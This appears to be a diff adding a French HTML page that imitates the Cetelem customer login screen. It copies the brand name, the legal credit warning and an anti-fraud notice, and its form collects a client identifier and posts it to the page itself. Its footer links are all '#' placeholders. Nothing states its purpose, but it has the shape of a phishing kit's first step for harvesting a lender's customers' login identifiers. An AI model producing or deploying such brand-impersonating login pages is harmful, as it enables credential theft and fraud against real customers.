@@ -1,0 +1,231 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <title>Connexion - Espace client</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Segoe UI', Arial, sans-serif;
+      background-color: #c0d4cc;
+      color: #333;
+    }
+
+    .logo {
+      text-align: center;
+      font-size: 30px;
+      font-weight: bold;
+      color: #2e7d54;
+      padding-top: 25px;
+    }
+
+    .subtext {
+      text-align: center;
+      font-size: 13px;
+      color: #555;
+      margin-bottom: 25px;
+      padding: 0 15px;
+    }
+
+    .login-box {
+      background: #fff;
+      max-width: 390px;
+      margin: 0 auto;
+      padding: 35px 30px;
+      border-radius: 10px;
+      box-shadow: 0 0 12px rgba(0, 0, 0, 0.15);
+      text-align: center;
+      box-sizing: border-box;
+    }
+
+    .login-box img {
+      width: 52px;
+      margin-bottom: 18px;
+    }
+
+    .login-box h2 {
+      font-size: 18px;
+      font-weight: 500;
+      margin-bottom: 22px;
+    }
+
+    label {
+      font-size: 14px;
+      display: block;
+      text-align: left;
+      margin-bottom: 6px;
+      font-weight: 500;
+    }
+
+    input[type="text"] {
+      width: 100%;
+      padding: 11px;
+      font-size: 15px;
+      border: 1px solid #aaa;
+      border-radius: 5px;
+      margin-bottom: 18px;
+      box-sizing: border-box;
+    }
+
+    .checkbox {
+      font-size: 14px;
+      text-align: left;
+      margin-bottom: 20px;
+    }
+
+    .checkbox input {
+      margin-right: 6px;
+    }
+
+    .btn {
+      background-color: #999;
+      color: #fff;
+      font-size: 15px;
+      padding: 11px 0;
+      width: 100%;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+
+    .forgot {
+      font-size: 13px;
+      margin-top: 12px;
+    }
+
+    .forgot a {
+      text-decoration: none;
+      color: #333;
+    }
+
+    .alert-box {
+      background-color: #fef6e0;
+      border-left: 5px solid orange;
+      padding: 18px 20px;
+      margin: 30px auto;
+      max-width: 420px;
+      font-size: 13.5px;
+      border-radius: 6px;
+      color: #444;
+      box-sizing: border-box;
+    }
+
+    .alert-box strong {
+      color: #d2691e;
+    }
+
+    .alert-box button {
+      margin-top: 12px;
+      padding: 6px 14px;
+      border: 1px solid #888;
+      background-color: #fff;
+      cursor: pointer;
+      border-radius: 4px;
+      font-size: 13px;
+    }
+
+    footer {
+      font-size: 12px;
+      text-align: center;
+      margin: 35px 15px 25px;
+      color: #333;
+    }
+
+    footer a {
+      margin: 0 6px;
+      color: #000;
+      text-decoration: none;
+    }
+
+    .social {
+      margin-top: 12px;
+    }
+
+    .social span {
+      font-size: 20px;
+      margin: 0 8px;
+    }
+
+    @media (max-width: 450px) {
+      .login-box,
+      .alert-box {
+        width: 92%;
+        padding: 20px;
+      }
+
+      .logo {
+        font-size: 26px;
+      }
+
+      .subtext {
+        font-size: 12px;
+        margin-bottom: 15px;
+      }
+
+      .login-box h2 {
+        font-size: 16px;
+      }
+
+      .btn {
+        font-size: 14px;
+      }
+
+      footer {
+        font-size: 11px;
+        line-height: 1.5;
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <div class="logo">cetelem</div>
+  <div class="subtext">
+    Un crédit vous engage et doit être remboursé. Vérifiez vos capacités de remboursement avant de vous engager.
+  </div>
+
+  <div class="login-box">
+    <div>
+      <img src="https://cdn-icons-png.flaticon.com/512/747/747376.png" alt="user icon">
+    </div>
+    <h2>Accéder à mon espace sécurisé</h2>
+    <form method="POST">
+      <label for="identifiant">Identifiant client</label>
+      <input type="text" name="identifiant" id="identifiant" placeholder="Ex : 1234567" required>
+
+      <div class="checkbox">
+        <input type="checkbox" id="remember">
+        <label for="remember">Mémoriser mon identifiant</label>
+      </div>
+
+      <button class="btn" type="submit">Suivant</button>
+    </form>
+
+    <div class="forgot">
+      <a href="#">Identifiant oublié ?</a>
+    </div>
+  </div>
+
+  <div class="alert-box">
+    <strong>⚠️ Contre la fraude, adoptez les bons réflexes</strong><br>
+    Ne communiquez jamais vos informations personnelles (identifiant, numéro de carte Cpay, code secret, etc.) par téléphone, email, chat ou réseaux sociaux. JAMAIS Cetelem ne vous les demandera.
+    <br>
+    <button>Découvrez nos conseils →</button>
+  </div>
+
+  <footer>
+    <a href="#">Virement express</a>
+    <a href="#">Réclamation</a>
+    <a href="#">Contact</a>
+    <a href="#">Questions / Réponses</a>
+    <a href="#">Mentions légales</a>
+    <a href="#">Cookies</a>
+    <a href="#">Préférences cookies</a>
+    <a href="#">Accessibilité</a>
+    <div class="social">
+    </div>
+  </footer>
+
+</body>
+</html>
